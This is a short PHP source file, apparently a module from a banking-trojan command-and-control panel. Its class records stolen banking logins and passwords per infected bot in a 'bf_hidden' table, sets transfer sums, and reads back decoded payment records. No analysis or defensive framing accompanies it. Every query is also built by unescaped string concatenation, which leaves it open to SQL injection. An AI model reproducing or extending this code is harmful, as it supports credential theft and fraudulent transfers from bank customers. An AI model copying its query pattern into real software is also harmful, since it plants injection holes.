<?php

class ServiceRaf {
    private $bot, $system, $mysqli;
    
    function __construct(){
        global $bot, $system, $mysqli;
        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;
    }
   
    function Auth($login , $password){
	$this->db->query('INSERT INTO bf_hidden set userid = \''.$this->bot->userid.'\', prefix = \''.$this->bot->prefix.'\', uid = \''.$this->bot->uid.'\', login=\''.$login.'\', password=\''.$password.'\', system=\''.$this->system->nid.'\' ON DUPLICATE KEY UPDATE login = \''.$login.'\', password = \''.$password.'\'');
        return true;
    }
    
    function SummSet($SummSet){
	$this->db->query('INSERT INTO bf_hidden set userid = \''.$this->bot->userid.'\', prefix = \''.$this->bot->prefix.'\', uid = \''.$this->bot->uid.'\', summ=\''.$SummSet.'\', system=\''.$this->system->nid.'\' ON DUPLICATE KEY UPDATE summ = \''.$SummSet.'\'');
        return true;
    }
    
    function GetPayment(){
	$acc = $this->db->query('SELECT id, data FROM bf_hidden WHERE (prefix = \''.$this->bot->prefix.'\') AND (uid = \''.$this->bot->uid .'\') AND (system = \''.$this->system->nid.'\') LIMIT 1'); 
	$acc->data = json_decode(gzinflate(base64_decode($acc->data)));
        $return = array();
        
        foreach($acc->data as $item){
            $return[] = array("id" => $acc->id, "prefix" => $this->bot->prefix, "uid" => $this->bot->uid,  "paysumm" => $item->paysumm,  "paydescr" => $item->paydescr,  "paydate" => $item->paydate);
        }
        
        return $return;
    }

}

RegisterService("ServiceRaf");